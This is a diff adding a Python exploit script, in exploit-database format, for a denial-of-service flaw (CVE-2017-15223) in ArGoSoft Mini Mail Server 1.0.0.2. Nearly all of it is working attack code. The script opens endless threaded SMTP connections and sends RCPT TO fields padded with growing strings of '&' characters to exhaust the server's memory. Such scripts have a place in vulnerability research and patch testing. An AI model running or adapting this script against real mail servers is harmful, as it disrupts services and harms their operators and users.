@@ -1,0 +1,62 @@
+#!/usr/bin/env python
+# coding: utf-8
+
+############ Description: ##########
+# The vulnerability was discovered during a vulnerability research lecture.
+#
+# Denial-of-service vulnerability in ArGoSoft Mini Mail Server 1.0.0.2
+# and earlier allows remote attackers to waste CPU resources (memory
+# consumption) via unspecified vectors.
+####################################
+
+# Exploit Title: ArGoSoft Mini Mail Server - DoS (Memory Consumption)
+# Date: 2017-10-21
+# Exploit Author: Berk Cem Göksel
+# Contact: twitter.com/berkcgoksel || bgoksel.com
+# Vendor Homepage: http://www.argosoft.com
+# Software Link: http://www.argosoft.com/rootpages/MiniMail/Default.aspx
+# Version:  1.0.0.2
+# Tested on: Windows 10
+# Category: Windows Remote Denial-of-Service
+# CVE : CVE-2017-15223
+
+
+import socket
+from threading import Thread
+
+def data():
+
+    ip = '127.0.0.1'
+    port = 25
+    counter = 50
+    string = '&'
+
+    while True:
+        try:
+            if counter >= 10000:
+                counter = 0
+            else:
+
+                counter = counter + 50
+                A = (string * counter) + 'user2@othermail.com'
+                print "String lenght: " + str(len(A))
+
+                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                sock.settimeout(5.0)
+                sock.connect((ip, port))
+                sock.send('HELO localhost\r\n' + 'MAIL FROM: user1@somemail.com\r\n' + 'RCPT TO: ' + A + '\r\nDATA\r\nMessage-ID:1224\r\SDFGQUIL\r\n"."\r\n' + 'QUIT\r\n')
+                sock.recv(1024)
+                sock.close()
+
+        except Exception as e:
+            continue
+
+def main():
+    iterations = int(input("Threads: "))
+    for i in range(iterations):
+        t = Thread(target=data)
+        t.start()
+
+if __name__ == '__main__':
+    main()
+
